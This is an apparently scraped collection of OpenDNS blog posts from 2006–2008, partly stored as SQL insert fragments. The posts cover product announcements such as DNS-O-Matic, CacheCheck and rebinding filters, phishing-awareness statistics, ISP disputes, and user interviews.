vulnerability.\n———————-\nThanks so much to everyone who attended our SysAdmin Appreciation party in San Francisco on Wednesday night. It was a huge success, with upward of 200 guests mingling with counterparts and sipping DNStinis.

Today’s overhaul makes the settings area of the Dashboard dramatically easier to use.  But first, let me explain what was wrong with the older version.\nOur old settings page on the Dashboard succumbed to feature bloat and became hard to navigate.  The left side navigation was lengthy and unintuitive — and not just to novice Internet users but even to our power users.  Every feature we added just became a new navigational element on the left side of the page.  And most of those features only had one option!  The reason this happened is simple — we like to constantly iterate on feedback from all of you and that means we roll out new features all the time.  While we love that part, it doesn’t work so well when you are trying to provide a consistent and intuitive interface for users.\nOur goals for the new settings page were very clear:\nMake the interface dramatically easier to use for novice Internet users.\nDon’t remove any of the existing functionality.\nProvide the level of detail our power users demand.\nIt was a tall order, but our all-star engineering team was able to do it.  Without further ado, here’s a quick walk-through:\nLeft side navigation\n\nThe left side navigation has been cut from 11 different choices down to 3.  Content Filtering, Customization and Advanced Settings.  Content Filtering is where you can block categories of sites, block individual domains, or whitelist domains.  It’s all in one place.  Customization is where you can modify the look and feel of the OpenDNS Guide and blocked pages with your own logo and messaging.  Advanced Settings, like it sounds, is one page with all of our various knobs and checkboxes where you can tailor our service to best meet your needs.\nContent Filtering\n\nThe Content Filtering page was previous spread out over four different pages.  Now it’s just one.  You can use one of our preset bundles of filters or customize things to pick and choose from any of the 50+ categories we have available.  Just below the categories you’ll see a much simpler way of individually allowing and blocking domains that you want to exclude from category blocking.  An example for this might be if you block the Social Networking category but want to “always allow” the business social networking website LinkedIn.\nAdvanced Settings\n\nThis page has all the knobs.  If you want to turn off stats processing, you do it here.  If you want to make sure OpenDNS works with your VPN, you can do it here.  All on one page.

There are four categories, in addition to the highest honor, SysAdmin of the Year 2008. The SysAdmin of the Year 2008 will be selected from the submissions to the four categories.\nNominate yourself, or nominate a peer. If you’re reading this, and you aren’t a SysAdmin, I can guarantee you benefit from a SysAdmin, so take a moment to recognize him or her. This is your chance to acknowledge the SysAdmin who keeps your Internets running.\nRules for nominations are simple. Send an e-mail to awards at opendns.com, indicate which category you’re nominating for in the subject line and tell us why your nominee deserves glory. Judging will be done by OpenDNS CEO David Ulevitch (a former SysAdmin himself) and the all-star operations team of George Patterson, Bill Fumerola and Jesse Davidson. The deadline for submissions is midnight on July 22, the night before the OpenDNS SysAdmin Appreciation Party in San Francisco. The real prize is the sheer honor that comes with being selected, but winners will also receive a $50 American Express gift card and be announced right here on this blog. The 2008 SysAdmin of the Year will get $200, a winner’s package of OpenDNS clothing and schwag and a spotlight on our Web site. This is the real deal.\nSo without further ado, your 2008 OpenDNS SysAdmin Awards categories are:\nBest Disaster Response Award\nA hurricane, a fire, an earthquake. A datacenter meltdown.

Learn to protect yourself, your company.', 'Allison Rhodes', 'May 5, 2008', 'We just posted PhishTank statistics for April 2008. No major surprises: The United States is, for the thirteenth straight month, hosting more phishes than any other country; A group of large banks, eBay, and PayPal round out the top most spoofed brands; And the PhishTank community of submitters and verifiers continues to have an impressively high accuracy rate.\nThe headlines tell us the phishers are not giving up. Seemingly every week we see reports of a new type of phishing scam. This week it’s Google AdWords phishing, where AdWords account holders are sent emails alerting them their account needs updating. The account holder logs into the spoofed AdWords interface and hands over their credit card information.\nThe AdWords phishing scam is interesting to me largely because, in lots of cases, it’s targeting businesses. People understand identity theft. But what happens when a business’s identity is stolen? There’s no easier or more efficient avenue to get reimbursed for a business than for an individual. Basically, whether you represent yourself or your company, you have to go to your credit card company and beg for forgiveness. (Whether or not it should be the banks — some of the most commonly spoofed brands — that are responsible for reimbursing money stolen through phishing is part of a separate debate.)\nAnd the spoofed AdWords account interfaces, at least the ones I’ve seen, are good. I can easily understand how the marketing person tasked with managing AdWords for their company could be fooled. I know plenty of small and mid-size companies that rely on online advertising to drive traffic to their site, and see huge dents in revenue when something goes wrong and the traffic doesn’t come. That marketing person has plenty of incentive to make sure their account information isn’t wrong and nothing is preventing potential customers from seeing their ads.\nExperts repeat the same warning about AdWords phishing that we’ve all heard about phishing in general for years: Educate yourself about phishing and look skeptically at URLs. Remember that as a general rule, you won’t be warned via e-mail that your account has been compromised, so if you are ever encouraged via e-mail to login to an account and update information, proceed with caution and look closely at the URL you’re encouraged to click.\nTake for example, one of the AdWords phishes someone submitted to PhishTank. See the “d0l9i.cn” in the middle of the URL? If you open a new window and load http://adwords.google.com/select/login, you’ll see the real site’s URL doesn’t include that series of characters. That should be a red flag.\n[NOTE: This is a known, verified phishing site. We recommend you do NOT visit it.]\n\nOpenDNS users and users of other services leveraging PhishTank data — McAfee, Opera, Yahoo! Mail, Kaspersky Labs, to name a few — have an extra line of defense when it comes to phishing — they benefit from PhishTank and the wisdom of the community. But it’s abolsutely a good idea to learn to look for inconsistencies in URLs and think twice before providing sensitive information online, whether it’s your own or your company’s.', 'Announcements', 'https://umbrella.cisco.com/blog/2008/05/05/phishtank-april-08-stats-learn-to-protect-yourself-your-company/');

In short, these attacks take advantage of design flaws or weaknesses in how some Internet applications (notably web browsers) cache DNS data so that internal network resources can be accessed by external servers regardless of firewall settings.\nThis can happen because the browser (or similarly exploitable vector) acts as a conduit between the private internal resource and the external server.  In plain English this means that some bad guy on the Internet can access your home access point, wireless access point, internal file server or any other networked device on your network just by getting you to load some javascript on a webpage.\nWhile this might seem like a browser issue, it’s fundamentally a DNS issue.  This is why OpenDNS created what will become a new class of filtering tools called Suspicious Response Filters.\n\nThese new filters are different from the filtering options we’ve offered to date in one important way.  Rather than filtering based on the DNS question being asked (eg, “Where is foo.com?”) these filters inspect the DNS reply before we send it back to you (eg, “Does this reply point to an internal resource?”).  Like most of our features, this is an industry first.  No other major DNS software or service offers anything like this.\nWhen I started OpenDNS I often told people one of my main goals was to design a global DNS service that empowered people to let the good DNS in and keep the bad DNS out, for whatever definition of good and bad they had.  This feature gets us one step closer to delivering on that promise.\nThe feature is turned off by default, but I encourage everyone to go into your account and turn it on.  Those of you with domains that point to private address space legitimately (to your intranet, for example) should also visit the domain whitelist page and whitelist your domain.  Naturally, any domain in your whitelist will not have its responses filtered in any way and will be explicitly allowed.', 'Announcements', 'https://umbrella.cisco.com/blog/2008/04/14/finally-a-real-solution-to-dns-rebinding-attacks/');

By leveraging the intelligence of our community (all of you) and our global network of servers we can provide a level Web content filtering that is robust and effective.  And, like everything else we do here, we’re offering this for free.\nHere’s how our game-changing system works:\nPeople add Web sites to our system and tag them with a category. For example YouTube.com would be appropriately tagged “video sharing” and MySpace.com would be appropriately tagged “Social Networks.” Other users come along and verify the accuracy of the submitters tag by voting.

All this adding and voting happens on our new Community Site – if you haven’t yet seen it, stop by and cast a few votes.

Our system has tens of thousands of people like you submitting and verifying the accuracy of Web sites’ inclusion in categories. This is in stark contrast to the handful of people employed for this job by security companies.\nIt’s faster moving. New Web sites and changes to existing Web sites are constantly being published to the Internet. Other Web content filtering tools update only once nightly, or even less frequently, and therefore fail to catch and categorize everything right away. OpenDNS has the advantage of tens of thousands of people adding and tagging sites at any given time, so users benefit from real-time updates.\nIt’s free to use.

Well here’s the super-abridged version:\nYour computer has something called an IP address associated with it that is unique on the Internet, a lot like a phone number is unique.\nIP addresses are how computers reach each other, just like we use phone numbers to reach our friends on the phone.\nUnfortunately, unlike phone numbers, most residential ISPs (Comcast, AT&T, Verizon, etc.) give you a dynamic IP address instead of one that is static (stays the same).\nWhenever your IP changes, it can make it hard for certain network services to figure out how to reach you.\nDNS-O-Matic fixes that.\nDNS-O-Matic solves this problem in a very general way that provides immense benefits to network service providers (like OpenDNS), software developers and, of course, users like yourselves.  A lot of small businesses and remote offices have dynamic IPs: DNS-O-Matic is for you, too.\nMost importantly, it’s completely free for all parties involved.\nSolving a troublespot for OpenDNS customers\nOpenDNS offers a lot of benefits on top of our free, fast, reliable DNS service. All of these benefits are tied to your current IP address. For those with static, unchanging IP addresses, this has always been simple.  For dynamic IP addresses (the majority of home users), this requirement has meant an extra step: installing or configuring software to send updates when your IP changes. It’s never been as easy as we want.\nSome of our more technical OpenDNS customers who use dynamic DNS hostnames asked for a way to use that hostname to track their changing IP. We took a wider view and came up with a scalable solution that helps our users, and is available to any company who needs to solve this problem.\nCreating a broader opportunity for the industry\nLike we did with PhishTank, OpenDNS is solving an industry-wide problem with a scalable and open solution. DNS-O-Matic works because everyone involved in the Dynamic IP process benefits:\nFirst: Every one of the hundreds of millions of Internet users with a dynamic IP address can now share their dynamic IP changes with all the services they care about in one update. One IP update will be redistributed to every service you subscribe to.  New services are automatically supported without requiring you to download anything or buy a new device.\nSecond: Developers of dynamic IP update software can support multiple services — current and future — by supporting a single, free API. One of the reasons that hardware vendors only support one or two Dynamic DNS services is that it’s hard to add support for each and every one in their hardware device.  Now they only need to support one standard and they can offer their customers the ability to use ANY or ALL services.  That’s a huge win for software developers. There’s already a healthy list of software that can send updates to DNS-O-Matic. The list will grow quickly; let us know if you have an addition.\nThird: Dynamic DNS service providers (like DynDNS, No-IP, ChangeIP, etc.) now benefit from increased distribution. As DNS-O-Matic support spreads, all the supported services become available to new customers without any effort. OpenDNS will add new services to that list as requested.\nMore importantly, new services have an immediate user-base from which to offer their service.  There is a lot of opportunity for applications to take advantage of DNS-O-Matic.  Everything from your Slingbox to your Xbox 360 could use DNS-O-Matic and make it easier to manage network devices at home or at work.\nSupporting new services is easy\nDuring the private beta, a DNS-O-Matic user suggested we add support for the BroadbandReports.com Line Monitoring service. We hadn’t heard of this worthwhile service before but adding support for it in DNS-O-Matic took about 30 minutes and was immediately available to every DNS-O-Matic user.\nThanks are in order…\nDuring the building of DNS-O-Matic, we’ve been thrilled to have the support of so many individuals and companies in the DNS world. DNS-O-Matic helps make services easier to use and businesses easier to operate because complementary (and even competitive) businesses are working together. Our thanks to the many developers and service providers we’ve spoken to recently: we look forward to more collaboration. We’re also grateful to our beta testers.\nWhy DNS-O-Matic?\nOh, and the name DNS-O-Matic? We chose that name because it’s fun to say and memorable. It’s also a hat tip to Ping-O-Matic, a service from some of the lead developers of WordPress for redistributing blog update notifications to dozens of services.  It’s simple, free and stable — three attributes we respect a lot in a great service and will uphold with ours.\nFinally\nYou can learn more in the DNS-O-Matic FAQ. The OpenDNS knowledge base has more information on Internet Protocol (IP) addresses and an explanation of dynamic IP addresses.\nLet us know what you think!', 'Announcements', 'https://umbrella.cisco.com/blog/2007/12/02/announcing-dns-o-matic/');

This time, systems held up without a major hitch, but the volume of messages prompted [NYSE CEO]Mr. Thain to call for an increase in capacity to 64,000 by year’s end.

We hope it will continue. – July 23, 2007\nWe care about delivering a great Internet experience worldwide, and it appears that many Italians are poorly served by their current DNS infrastructure.\nSeveral times over the last several months, Telecom Italia has blocked DNS requests from OpenDNS servers. What happens? Our customers in Italy are unable to resolve domains that uses Telecom Italia for their authoritative DNS, for example: pf.rossoalice.virgilio.it (a large Italian ISP).\nFor months, we’ve jumped through technical hoops to work around these blocks, even though all we’re doing is what any recursive DNS service would do: ask for the location of a domain from the respective authoritative server.\nWe’ve communicated through several channels: email, IRC, telephone. (We don’t speak Italian, but we’ve made an effort through translation services.)\nResult? Nothing. (In DNS land, we’d call it a SERVFAIL.)\nIf anyone responsible and responsive at Telecom Italia wants to help us resolve this matter, we’re more than willing to work this out directly.\nFor all those Italian customers who have been affected now and again, we apologize. We are still trying to resolve this problem via normal channels. But we’ve been quite patient so far, and we’re a bit tired of banging our heads against this particular wall.\nHere’s why we’re naming Telecom Italia.\nFirst, dnsti.interbusiness.it and dnsts.interbusiness.it have blocked our requests.\nSecond, the interbusiness.it domain is owned by Telecom Italia, according to whois data.\nDomain:             interbusiness.it\nStatus:             ACTIVE\nCreated:            1996-01-29 00:00:00\nLast Update:        2007-01-30 00:36:13\nExpire Date:        2008-01-29\n\nRegistrant\n  Name:             Telecom Italia S.p.A.\n  ContactID:        TELE616-ITNIC\n  Address:          Via Paolo Di Dono, 44\n                       Roma\n                       00143\n                       RM\n                       IT\n  Created:          2007-03-01 10:44:12\n  Last Update:      2007-03-01 10:44:12\n\nNameservers\n  dnsti.interbusiness.it\n  dns.opb.interbusiness.it\n  dns3.nic.it\n  dnsts.interbusiness.it\nI look forward to sharing a solution.\n\nTelecom Italia non risponde ad OpenDNS\nOpenDNS si impegna per fornire in tutto il mondo il miglior servizio agli utenti di Internet, ma sembra che molti italiani debbano fare i conti con un’infrastruttura DNS molto carente.\nPer diverse volte negli ultimi mesi Telecom Italia ha bloccato richieste DNS dai server OpenDNS. Cosa succede quindi? Molti nostri clienti in Italia non riescono a risolvere nomi di domini che usano Telecom Italia come server DNS autoritativi. Per esempio, pf.rossoalice.virgilio.it (un importante ISP italiano) viene risolto in maniera errata.\nPer mesi abbiamo utilizzato espedienti tecnici per aggirare questi blocchi, anche se tutto quello che stiamo facendo è quello che farebbe ogni servizio di DNS ricorsivo: richiedere l’indirizzo di un dominio al suo rispettivo server autoritativo.\nAbbiamo provato a contattare Telecom Italia per email, IRC e telefono (non parliamo italiano ma abbiamo fatto dei tentativi utilizzando dei servizi di traduzione).\nRisultato: nessuna risposta (nel campo dei DNS lo chiamiamo SERVFAIL).\nSe qualche responsabile o addetto di Telecom Italia è interessato ad aiutarci a risolvere questo problema saremmo dispostissimi a collaborare direttamente in tale senso.\nChiediamo scusa a tutti i clienti italiani che hanno riscontrato e stanno ancora riscontrando questo problema. Stiamo ancora provando ad eliminare il blocco attraverso i normali canali. Fin qui siamo stati abbastanza pazienti ma ora siamo un po’ stanchi di doverci scervellare con questo problema.\nEcco perché crediamo che Telecom Italia sia la causa del problema.\nInnanzitutto, dnsti.interbusiness.it e  dnsts.interbusiness.it hanno bloccato le nostre richieste. Inoltre, il dominio interbusiness.it, secondo i dati del whois, appartiene a Telecom Italia.\nDomain:             interbusiness.it\nStatus:             ACTIVE\nCreated:            1996-01-29 00:00:00\nLast Update:        2007-01-30 00:36:13\nExpire Date:        2008-01-29\n\nRegistrant\n  Name:             Telecom Italia S.p.A.\n  ContactID:        TELE616-ITNIC\n  Address:          Via Paolo Di Dono, 44\n                       Roma\n                       00143\n                       RM\n                       IT\n  Created:          2007-03-01 10:44:12\n  Last Update:      2007-03-01 10:44:12\n\nNameservers\n  dnsti.interbusiness.it\n  dns.opb.interbusiness.it\n  dns3.nic.it\n  dnsts.interbusiness.it\nSpero di aggiornarvi presto con una soluzione.', 'Community', 'https://umbrella.cisco.com/blog/2007/07/17/telecom-italia/');

(This ‘DNS caching’ method is currently being replaced.)\nThe configuration error meant some (not all) customers in the Cambridge area would have been forced to use our own DNS servers (transparently redirected).\nOne of our customers has kindly tested this for us since we made the configuration change and confirmed it is now working as expected.\n\nHopefully this ends the story: we always permit use of external DNS servers on our Cable/DSL services.  I’d be grateful if you could update your blog to ensure customers know the up to date information (ie, it should work fine :o) ).\nOn behalf of Virgin Media I really do apologise for the disruption this has caused, as it should not have happened.  This type of error should be near impossible in the future as mentioned above– the current system is being replaced.\nMany thanks,\nAdam Ford\nPrincipal Internet Systems Engineer\nVirgin Media Engineering & Operations', 'Announcements;Community', 'https://umbrella.cisco.com/blog/2007/07/05/virgin-media-ntl-opendns-ok/');

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (2073, 'Google turns the page… in a bad way.', 'David Ulevitch, Founder/CEO', 'May 22, 2007', 'This is a long post but it’s worth the read.  In short, Google and Dell have teamed up to install some software on Dell computers that borders on being spyware.  I say spyware because it’s hard to figure out what it is and is even harder to remove.  It also breaks all kinds of OpenDNS functionality. At the end, I’ll tell you what we’re doing about it.\nAbout a year ago Google and Dell announced a partnership to include the Google Toolbar on new Dell computers.  At the same time, Google was trying to convince the Department of Justice that changing the default search engine in the (then) new IE7 was too difficult (when in reality it’s really simple).  Installing the toolbar meant that users would have Google as their default search engine in IE7.  It also meant that Dell and Google would share some of the revenue from the advertising clicks that resulted from these installations, much like The Mozilla Foundation does with its Firefox browser.\nThe computer hardware business has razor-thin margins which means making a profit is tough.  So the opportunity for Dell to get a recurring revenue stream from an existing customer long after the sale of the computer is more than just enticing, it’s huge. It also means a couple other things:\nDell and Google have an incentive to make it very hard for users to turn this off.\nBecause users can’t get rid of it, Dell and Google can get away with putting more ads on the page and pushing user-relevant content off the page.\nThey’re now doing both of these things.\nThe screenshot below shows what the Dell-branded Google search results page looks like when you make a typo in your address bar.  You can’t even see the search results in the picture (800×600 resolution) because the entire top of the page and right side are plastered with ads.\n\n\nThis page isn’t being shown to Dell owners just because they have the Google Toolbar. In fact, uninstalling the Google Toolbar won’t get rid of it.  Dell and Google are now installing a second program on computers that intercepts all sorts of queries that the browser would normally try to resolve.  This program has no clear name and is very hard to uninstall.  In some circles, people would call this spyware.\nGoogle tries to explain the hidden software with this ambiguous statement:\n\n\nWow.  Are you kidding me? In order for a user to get rid of this brokenness the person has to remove a piece of software called “Browser Address Error Redirector?”  That barely makes sense to techies and it makes no sense to normal people.  Would your Mom uninstall something with a name like that?  I don’t think so.\nNot only that, but due to some support inquiries we’ve gotten it seems like this software is being installed on older Dell computers that use some sort of automatic update service from Dell.  Is this thing spreading?  Ugh.  How bad is it?\nLet’s see what happens with certain queries and what shows up above the fold.  For good measure, I’ve included what we do too, for comparison.\nTyped               Dell/Google             OpenDNS\r\nDigg.xom            Paid results            Automatically typo-corrected\r\nDigg                Paid results            Shortcut / Search results\r\nDigg,com            Paid results            Search results\nAs an aside, for every single one of these pages, OpenDNS provides an unpaid link at the top of the page asking, “Did you mean Digg.com?”  If Google and Dell were really trying to give users a good experience, they would offer that, at the very least.  They are certainly smart enough.\nWhat do we do for the user?\nI’ve included a screenshot of what OpenDNS shows people, too, for comparison:\n\n\nIs Google being true to their roots?\nI love Google’s technology, don’t get me wrong.  But I think Google has turned a page here.  They have now enabled a piece of software that is hard to remove and forces users to look at a really bad page.  In fact, Google knows that this provides users with a dramatically worse experience.\nHere’s a press release that talks about what people look at while using Google. (You can be sure Google uses similar technology internally.) Here’s a screenshot, with a red-line indicating what is below the fold.\n\n\nThe Dell-branded page doesn’t look anything like that at all. If you were to put a heatmap on the Dell-branded page… well, users can only look at ads. Dell and Google’s behavior here isn’t okay. Users never asked for this experience and they can’t get rid of it!\nMoreover, this new “functionality” breaks things. Instead of making DNS requests, the address bar now sends single word queries to Google. This application breaks a lot of OpenDNS functionality our users love. Typo correction? Broken. Shortcuts? Broken. Google’s application breaks just about every user-benefiting feature we provide with client software that no user ever asked for.\nWe enjoy challenging problems at OpenDNS. But we’d rather spend our time making the Internet better rather than solving problems that shouldn’t have been created in the first place.  We know that Google is capable of launching great products and services, but this isn’t one of them.\nHow is OpenDNS solving this problem?\nFortunately, we have a fix which does not require more client software. OpenDNS applies intelligence to the network, and we’ve stretched a bit beyond DNS itself to work around Google’s mis-directed efforts.  Before I get into that, let me digress for a second:\nMany of you have toolbars installed on your computer.  Some of you have the Google toolbar, some have the Yahoo toolbar, and some of you have Zwinky (Don’t ask… I think little kids use it).  These toolbars are able to see every single website you visit when you surf the web.  Most report your surfing habits back to the company that operates the toolbar. Toolbars are something worthy to be concerned about, if only because so little attention is paid to them.\nOkay, back to our solution.  We did not want to enter the toolbar market. We don’t have any interest in it, and we don’t believe more software installations are the answer.\nThe solution to this problem was to route Google requests through a machine we run to check if the request is a typo or one of your shortcuts.  If it is a typo or shortcut then we do what we always do, just fix the typo or launch your shortcut and send you off on your way.  If it’s not one of those two things, we pass it on to Google for them to give you search results.  This solution provides the best of both worlds: OpenDNS users get back the features that they love and Google continues to operate without problems.\nI want people to know (and be sure) that we aren’t doing anything shady. We’re not spying on you.  We don’t care what websites you visit. (Check our privacy policy.) Solving the issue like this allows us to fix the problems with Google (and future similar services) without having to route all your traffic through a toolbar or other service.\nBelow, there is a mini-FAQ. I know a bunch of you are very technical might have additional questions about how this works.  We’re happy to talk about it.  To keep this post from getting unwieldy I’ve made a page where you can ask all the technical questions you want.  I’ll read the comments and update that page with answers as they come in.\nUpdate:  Danny Sullivan has a great write-up on this too.\nMini-FAQ\nWill this make Google slower?\nNo.  We are doing this URL redirection on all of our servers in all of our locations.  Loading Google should take no longer than it took before we made this change.  Also, all of Google’s other domains like like gmail.com and even subdomains like reader.google.com still work as they did before.  We don’t re-route any of those.\nAre you tracking or keeping a log of my searches?\nNo way.  Absolutely not.  We don’t keep copies of your cookies, your search history or anything else that would cause an AOL Search disaster.  Any logs we have for technical debugging are wiped within an hour of the request, usually much sooner.  We also aren’t in a position to log it for the government, and we aren’t a front for the CIA.  “The Feds” already know that if they want to know what websites you visit they can just talk to your ISP, unfortunately.\nDoes this break anything?\nNope, but let us know if you see anything awry.\nWhat about secure logins to Google?  Can you see them?\nNo.  Typically when people try to proxy SSL pages it creates an error.  We didn’t want that to happen so we did something we think is pretty clever.  We actually just forward your packets on to Google when you are doing anything that is secure.  This keeps your data encrypted and ensures we can’t perform a Man in the middle attack on you.\nDoes Google know about this?\nWe contacted a couple of friends who work on the security side of things at Google to give them a friendly heads up.  They said it’s not a technical or security problem on their end. Based on that we don’t think Google has any problem with it.  The technology we’re using is pretty standard stuff.', 'Announcements;Community', 'https://umbrella.cisco.com/blog/2007/05/22/google-turns-the-page/');

Think you’d make a good interviewee for a Five Questions post? Let us know!\n\nJudi Sohn\nMomatHome\nOpenDNS: Tell us about yourself. What do you do for a living?\nJS: I am Director of Operations and Communications for C3: Colorectal Cancer Coalition.  C3 is a grassroots patient advocacy organization committed to defeating colorectal cancer through research, policy & awareness. I lost my father to colon cancer in 1999, and that’s what started me in advocacy. I was furious that he died of a disease that could have been prevented, had he known how. And that the disease was fatal because it was caught too late and research couldn’t save him. The organization was started in March 2005 by a group of us who have been working against colon cancer for a while, but we saw that there wasn’t enough attention on being the “squeaky wheels” against the disease the way the breast cancer and HIV/AIDS communities had. Our website is the top resource on the Internet for colorectal cancer-specific advocacy and research information that is patient-centered and continually updated.\nI’ve also been blogging on my personal website since January 2003. Before taking a fulltime position with C3, I was a freelance graphic designer working under the name “Mom at Home Design” so that’s why I’ve had that great domain since 1998. Now it’s just a blog rather than a blog & portfolio site. I’m also a writer for Om Malik’s GigaOm site, Web Worker Daily.\nOpenDNS: That’s a lot. What do you not do?\nDoes OpenDNS improve the blogging experience? \n“Yes. Anything that helps my computer react as fast as I’m thinking, which is pretty fast these days, helps my blogging experience. It also helps me when I type too fast and make a mistake in the URL. OpenDNS is smarter than I am.”\n—Judi Sohn\nJS: Work in an office outside my home from 9-5! I do everything for C3 from my home office a few hundred miles away from everyone else. It’s challenging to stay connected, especially as the organzation grows, but I think I pull it off.\nOpenDNS: How did you first get into blogging?\nJS: It was late 2002 and I was bored and curious. I started reading blogs first, and I was very interested when they talked about how they did it. Most people hate those “how I blog” process posts, but I loved them. I saw that they were talking about something called Movable Type, and I liked the way those sites looked and worked. I read the instructions for installing and configuring Movable Type and it didn’t seem so hard, so on a whim one afternoon I tried it. I started by talking about what was going in my life, which at that time was major construction on my house. It took a couple of months to get my first comment, and then it just grew from there. My blog is not huge by any stretch. Not even close. But I know I have a little bit of a following, which is nice.\nOpenDNS: Does OpenDNS improve the blogging experience?\nJS: Yes. Anything that helps my computer react as fast as I’m thinking, which is pretty fast these days, helps my blogging experience. It also helps me when I type too fast and make a mistake in the URL. OpenDNS is smarter than I am.\nOpenDNS: What’s your advice to other moms at home?\nJS: Don’t sweat the small stuff. Everything I do for my kids, I ask myself, “Is this something that the 2017 version of Judi will want to come back and kick my butt for?” If the answer is no, I let it go.\nIt’s easy for people to think that you’re a stay-at-home Mom with lots of flexible hours, when you’re really not. I have more flexibility than most, but if anything I have less free time than people with traditional office jobs. Any hours I take away from the day have to be made up somewhere. With such a small organization, it’s not like I have a large staff to delegate to. It’s really hard to draw hard and fast lines between work and home life, so I would advise moms to be prepared for serious blending (and to be your own tech support) or don’t even try working this way.\n\nFive Questions', 'Community', 'https://umbrella.cisco.com/blog/2007/04/04/five-questions-judi-sohn/');

If you wonder what’s in the OpenDNS cache for a domain, take a look. If you want OpenDNS to refresh its cache for a domain, use CacheCheck to do it yourself.\nBackground on CacheCheck\nBecause we’ve seen such vibrant adoption (thanks!), OpenDNS has established itself as the leader in recursive DNS services. People expect more from a leader, as they should. So, when a domain doesn’t resolve — especially one they’ve visited successfully before — users are quick to ask us “What’s wrong? Why does ‘insert-domain-name-here’ not resolve?”\nExample, CacheCheck results\nWe welcome these questions: our entire company is built around getting you where you want to go on the Internet as fast as possible and as reliably as possible. If there’s a problem we can fix, we want to know about it immediately.\nBut we’re not responsible for the entire DNS; we’re just a visible link in the chain. When a valid domain is not resolving, there are two common possibilities:\nthe domain is being moved, and the old address is still cached since the Time-To-Live (TTL) has not expired\nthe domain’s nameservers are not responding\nFor #1, CacheCheck lets you fix the problem immediately. OpenDNS has a huge cache to help make your Internet experience faster. OpenDNS usually holds an address for the full TTL (never longer!!). So, if a domain has been moved without lowering the TTL first, we may have the old address cached. CacheCheck, please! (groan)\nWe can’t do anything about #2 yet, but we can make the situation clear both to the domain owner and the would-be website visitor.\nCacheCheck came from an internal tool we built to let us peek into our cache, and selectively clear it. Today, that unique functionality is available to everyone. No one else offers this kind of control and insight. You can ask any recursive DNS server for an address, but if the answer is wrong, there’s no recourse and little information.\nDomain owners, especially, should find this first-of-its-kind tool valuable for domain management. Everything we do at OpenDNS is aimed at making the Internet better through DNS. CacheCheck is our first feature aimed squarely at domain owners. Fortunately, anyone who visits a website benefits, too.\nP.S. Terri Wells at Devshed got some early insight into this tool for her article “OpenDNS on Mission to Improve Domain Name System” published last week. See page 4.\nP.P.S. For the record, OpenDNS always suggests lowering TTL before migrating a domain to a new server. But we understand that domain migrations are not always planned, so CacheCheck can help domain owners out of a BIND (bad DNS humor).', 'Announcements', 'https://umbrella.cisco.com/blog/2006/12/19/cachecheck/');

What do you do for a living?\nJF: I’m a former Marine with a BA in History and a MBA and I’m currently in sales for a Fortune 100 company.  I’ve been married for over 10 years to my beautiful wife and have a son as well as a daughter who was born just 4 weeks ago.  I got into computers about 6 years ago when my Geek friend Mike convinced me to build my own PC.  I’ve been hooked ever since and am a completely self-taught Geek as I’ve never taken a single course on anything to do with computers.  I just turned 40 so when I went to school PCs were still a rarity.  I’m not an expert on anything related to computers, just a friendly neighborhood Geek as many of my neighbors and friends now come to me with their computer problems and questions.  I enjoy building computers more than fixing them and like to spend time playing PC Games with my son and by myself when I get the chance.\nOpenDNS: How did you come up with the name for your Web site?\nJF: Pretty silly really.  Last Christmas I had a couple weeks of unused vacation that I was taking and a few days into it I was looking at some websites and just wondered how hard it would be to create my own for fun.  My friends and I joke that I’m a Computer Geek and that’s how I let people know I enjoy computers as a hobby, by referring to myself as a Geek.  (For the record, I’m a Geek, not a Nerd.)  So once I found a site to host my website I started searching for any domain names that had to do with Geek that were available. As you would expect, many are already taken.  I wanted the name to be funny and easy for people to remember so I settled on Big Geek Daddy cause I’m 6’3″ 210lbs, a Computer Geek, and a Daddy.  My goal with the website is simply to create a place where other people can find useful resources about computing, many of which are free, and have fun doing it at the same time. If I make any money off of it in the process then that’s just an added bonus.\nOpenDNS: What changes to you Internet experience have you noticed since switching to OpenDNS?\nJF: The biggest change I’ve noticed is how much faster web pages open with less errors – it is definitely noticeable.\n\nOpenDNS: Who would you recommend OpenDNS to?\nJF: Everyone. The excellent directions with pictures you have on your website on how to correctly set up OpenDNS really make installing it pretty easy. My exact router wasn’t listed so I just picked the router from the same manufacturer that was closest and the directions worked fine.  OpenDNS is an easy way to add another level of security to your PC plus get a faster internet connection and best of all it’s FREE!\nOpenDNS: How many hours do you spend per day looking for videos to add to your archive?\nJF: Not as many as you’d think.  On average I spend less than 20 minutes per day looking at funny videos on the web.  Of course that adds up to about 2 hours a week which would be excessive for many people.  My tradeoff is that I tend to watch less than two hours of TV shows each week.  Many of the videos are actually sent to me by friends as well so I don’t have to search for them. It takes me about 30 minutes each week to update the humor section of Big Geek Daddy.  I do spend an additional 1-3 hours a day on the internet working with my website or blog, online store, checking email, and just viewing other people’s websites.', 'Community', 'https://umbrella.cisco.com/blog/2006/12/14/five-questions-with-an-opendns-user-john-fitch/');

He turned us on way back in July!\nMike Lucas\nProfessional Geek\nOpenDNS: How did you first learn what DNS stands for?\nML: Hard to remember exactly when. I’ve been very interested in working with computers for over ten years now. I will admit though that up until maybe just a year or two ago, I never put much thought into the performance of the DNS servers that I used. I always just used the ones provided to me by my ISP, without knowing I had choices in the DNS servers I used, or that there were better ones out there.\nOpenDNS: What improvements has OpenDNS made to your Internet experience?\nML: Faster DNS lookup times, and the reliability of the DNS servers, would be the most immediate and noticeable improvement. My ISP that I get my cable modem service from has been growing greatly over the last several years, and over the last year especially has been adding new customers at an extraordinary rate. Maybe about 6 to 8 months ago I first started to experience problems with my ISP’s DNS servers. I started repeatedly receiving failed DNS lookups to websites that I knew to be working. I didn’t narrow the problem  down to DNS for a few days really, and only did after I had eliminated the possibility of it being a new Firefox bug or a wrong setting in my network somewhere. I finally realized the problem was in fact my ISP’s DNS servers as it was only occurring at peak times, at nights and on weekends, times when the majority of my ISP’s customers were all online, and the DNS servers were being overloaded. I first started using a local network DNS program called TreewalkDNS to resolve the issue, which did eliminate my problems, and then several months later I read a news story on CNET about the launching of OpenDNS. The same day I uninstalled TreewalkDNS to give OpenDNS a try, and have never switched back.\nOpenDNS: What advice would you offer to other geeks considering switching to OpenDNS?\nML: Just give it a try. It’s very easy to start using, OpenDNS.com provides very easy-to-follow, step-by-step instructions, with pictures even, on how to start using OpenDNS on all operating systems and in hardware routers. There’s no software to install, so operating system compatibility is not even an issue. The instructions are very easy to follow even for an average or even sub-average computer user. You will more then likely notice the difference immediately, and if not, you can just switch back to your ISP’s DNS servers at any time. But once you try OpenDNS, you won’t be switching back.\nOpenDNS: Is OpenDNS really “Safer, Faster and Smarter” like we claim?\nML: Absolutely. Not only is OpenDNS more reliable then my 